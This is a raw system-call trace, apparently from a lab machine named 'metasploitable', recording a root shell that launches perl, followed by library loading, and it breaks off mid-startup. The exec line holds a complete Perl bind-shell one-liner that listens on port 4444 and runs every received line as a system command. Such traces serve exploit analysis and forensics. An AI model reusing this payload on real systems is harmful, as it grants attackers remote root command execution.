12205 20:24:32.416138 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d35000
12205 20:24:32.416149 mmap2(0xb7d3d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d3d000
12205 20:24:32.416165 close(1)          = 0
12205 20:24:32.416177 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12205 20:24:32.416191 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12205 20:24:32.416229 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12205 20:24:32.416331 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12205 20:24:32.416348 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d2a000
12205 20:24:32.416359 mmap2(0xb7d33000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d33000
12205 20:24:32.416376 close(1)          = 0
12205 20:24:32.416397 munmap(0xb7ee5000, 29913) = 0
12205 20:24:32.416412 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12205 20:24:32.416427 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12205 20:24:32.416438 _llseek(1, 0, [0], SEEK_CUR) = 0
12205 20:24:32.416450 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12205 20:24:32.416466 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7eec000
12205 20:24:32.416476 _llseek(1, 1624, [1624], SEEK_SET) = 0
12205 20:24:32.416491 munmap(0xb7eec000, 1624) = 0
12205 20:24:32.416501 close(1)          = 0
12205 20:24:32.428804 getpgrp()         = 3831
12205 20:24:32.428804 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12205 20:24:32.428804 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12205 20:24:32.428824 brk(0x8101000)    = 0x8101000
12205 20:24:32.428859 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.428875 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.428889 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12205 20:24:32.428931 brk(0x8102000)    = 0x8102000
12205 20:24:32.428959 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12205 20:24:32.428978 stat64("/sbin/AB", 0xbfa43098) = -1 ENOENT (No such file or directory)
12205 20:24:32.428991 stat64("/bin/AB", 0xbfa43098) = -1 ENOENT (No such file or directory)
12205 20:24:32.429002 stat64("/usr/sbin/AB", 0xbfa43098) = -1 ENOENT (No such file or directory)
12205 20:24:32.429015 stat64("/usr/bin/AB", 0xbfa43098) = -1 ENOENT (No such file or directory)
12205 20:24:32.429028 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12205 20:24:32.429043 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d606f8) = 12206
12206 20:24:32.459533 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12206 20:24:32.459568 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12206 20:24:32.459582 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12206 20:24:32.459594 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12206 20:24:32.459611 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12206 20:24:32.459628 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12206 20:24:32.459641 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12206 20:24:32.459705 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12206 20:24:32.459720 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12206 20:24:32.459798 exit_group(127)   = ?
12205 20:24:32.488779 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  20:24:32.488796 waitpid(12205,  <unfinished ...>
12205 20:24:32.488811 <... rt_sigprocmask resumed> NULL, 8) = 0
12205 20:24:32.508712 --- SIGCHLD (Child exited) @ 0 (0) ---
12205 20:24:32.508749 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12206
12205 20:24:32.508785 waitpid(-1, 0xbfa42d18, WNOHANG) = -1 ECHILD (No child processes)
12205 20:24:32.508796 sigreturn()       = ? (mask now [])
12205 20:24:32.508820 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12205 20:24:32.508849 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12205 20:24:32.508860 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12205 20:24:32.508872 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12205 20:24:32.508890 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12205 20:24:32.508902 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12205 20:24:32.508937 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12205 20:24:32.508957 stat64("/sbin/perl", 0xbfa430c8) = -1 ENOENT (No such file or directory)
12205 20:24:32.508969 stat64("/bin/perl", 0xbfa430c8) = -1 ENOENT (No such file or directory)
12205 20:24:32.508981 stat64("/usr/sbin/perl", 0xbfa430c8) = -1 ENOENT (No such file or directory)
12205 20:24:32.508992 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12205 20:24:32.509010 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12205 20:24:32.509036 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12205 20:24:32.509051 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d606f8) = 12207
12207 20:24:32.548784 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12207 20:24:32.548820 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12207 20:24:32.548833 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12207 20:24:32.548845 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12207 20:24:32.548861 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12207 20:24:32.548877 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12207 20:24:32.548890 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12207 20:24:32.548928 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12207 20:24:32.549025 brk(0)            = 0x8153000
12207 20:24:32.549046 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549069 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0a000
12207 20:24:32.549085 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549103 open("/etc/ld.so.cache", O_RDONLY) = 1
12207 20:24:32.549116 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12207 20:24:32.549134 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f02000
12207 20:24:32.549144 close(1)          = 0
12207 20:24:32.549155 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549181 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12207 20:24:32.549225 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12207 20:24:32.549333 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12207 20:24:32.549350 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7efe000
12207 20:24:32.549363 mmap2(0xb7f00000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f00000
12207 20:24:32.549379 close(1)          = 0
12207 20:24:32.549390 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549405 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12207 20:24:32.549418 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12207 20:24:32.549504 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12207 20:24:32.549521 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed9000
12207 20:24:32.549532 mmap2(0xb7efc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7efc000
12207 20:24:32.549548 close(1)          = 0
12207 20:24:32.549559 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549573 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12207 20:24:32.549587 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12207 20:24:32.549687 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12207 20:24:32.549732 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed8000
12207 20:24:32.549762 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec0000
12207 20:24:32.549773 mmap2(0xb7ed4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7ed4000
12207 20:24:32.549787 mmap2(0xb7ed6000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ed6000
12207 20:24:32.549801 close(1)          = 0
12207 20:24:32.549812 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.549825 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12207 20:24:32.549839 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12207 20:24:32.549926 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12207 20:24:32.549943 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d71000
12207 20:24:32.549954 mmap2(0xb7eba000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7eba000
12207 20:24:32.549969 mmap2(0xb7ebd000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ebd000
12207 20:24:32.549982 close(1)          = 0
12207 20:24:32.549994 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12207 20:24:32.550007 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12207 20:24:32.550021 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12207 20:24:32.550111 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12207 20:24:32.550128 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d3f000
12207 20:24:32.550139 mmap2(0xb7d48000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d48000
12207 20:24:32.550153 mmap2(0xb7d4a000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d4a000
12207 20:24:32.550173 close(1)          = 0
12207 20:24:32.550226 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d3e000
12207 20:24:32.550254 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d3e8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12207 20:24:32.550317 mprotect(0xb7eba000, 4096, PROT_READ) = 0
12207 20:24:32.550359 munmap(0xb7f02000, 29913) = 0
12207 20:24:32.550372 set_tid_address(0xb7d3e908) = 12207
12207 20:24:32.550381 set_robust_list(0xb7d3e910, 0xc) = 0
12207 20:24:32.550390 futex(0xbfcab940, 0x81 /* FUTEX_??? */, 1) = 0
12207 20:24:32.550405 rt_sigaction(SIGRTMIN, {0xb7ec42c0, [], SA_SIGINFO}, NULL, 8) = 0
12207 20:24:32.550418 rt_sigaction(SIGRT_1, {0xb7ec4340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12207 20:24:32.550430 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12207 20:24:32.550444 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12207 20:24:32.550463 uname({sys="Linux", node="metasploitable", ...}) = 0
12207 20:24:32.550509 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12207 20:24:32.550553 brk(0)            = 0x8153000
12207 20:24:32.550563 brk(0x8174000)    = 0x8174000
12207 20:24:32.550607 getuid32()        = 0
12207 20:24:32.550617 geteuid32()       = 0
12207 20:24:32.550626 getgid32()        = 0
12207 20:24:32.550635 getegid32()       = 0
12207 20:24:32.550705 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d1d000
12207 20:24:32.550769 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12207 20:24:32.550787 read(1, "}\225\215t", 4) = 4
12207 20:24:32.550800 close(1)          = 0
12207 20:24:32.550818 time(NULL)        = 1495671872
12207 20:24:32.550874 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfcab610) = -1 ENOENT (No such file or directory)
12207 20:24:32.550892 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfcab610) = -1 ENOENT (No such file or directory)
12207 20:24:32.550905 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfcab610) = -1 ENOENT (No such file or directory)
12207 20:24:32.550920 stat64("/usr/local/lib/perl/5.8.7", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550932 stat64("/usr/local/share/perl/5.8.7", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550944 stat64("/usr/local/lib/perl/5.8.6", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550956 stat64("/usr/local/share/perl/5.8.6", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550967 stat64("/usr/local/lib/perl/5.8.4", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550979 stat64("/usr/local/share/perl/5.8.4", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.550990 stat64("/usr/local/lib/perl/5.8.3", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551006 stat64("/usr/local/share/perl/5.8.3", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551018 stat64("/usr/local/lib/perl/5.8.2", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551030 stat64("/usr/local/share/perl/5.8.2", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551041 stat64("/usr/local/lib/perl/5.8.1", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551053 stat64("/usr/local/share/perl/5.8.1", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551064 stat64("/usr/local/lib/perl/5.8.0", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551075 stat64("/usr/local/share/perl/5.8.0", 0xbfcab750) = -1 ENOENT (No such file or directory)
12207 20:24:32.551097 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab448) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.551111 _llseek(0, 0, [0], SEEK_CUR) = 0
12207 20:24:32.551123 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab448) = -1 EBADF (Bad file descriptor)
12207 20:24:32.551133 _llseek(1, 0, 0xbfcab490, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12207 20:24:32.551144 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab448) = -1 EINVAL (Invalid argument)
12207 20:24:32.551154 _llseek(2, 0, 0xbfcab490, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12207 20:24:32.551216 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12207 20:24:32.551250 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab508) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.551277 _llseek(1, 0, [0], SEEK_CUR) = 0
12207 20:24:32.551289 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12207 20:24:32.551300 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12207 20:24:32.551319 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12207 20:24:32.551371 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
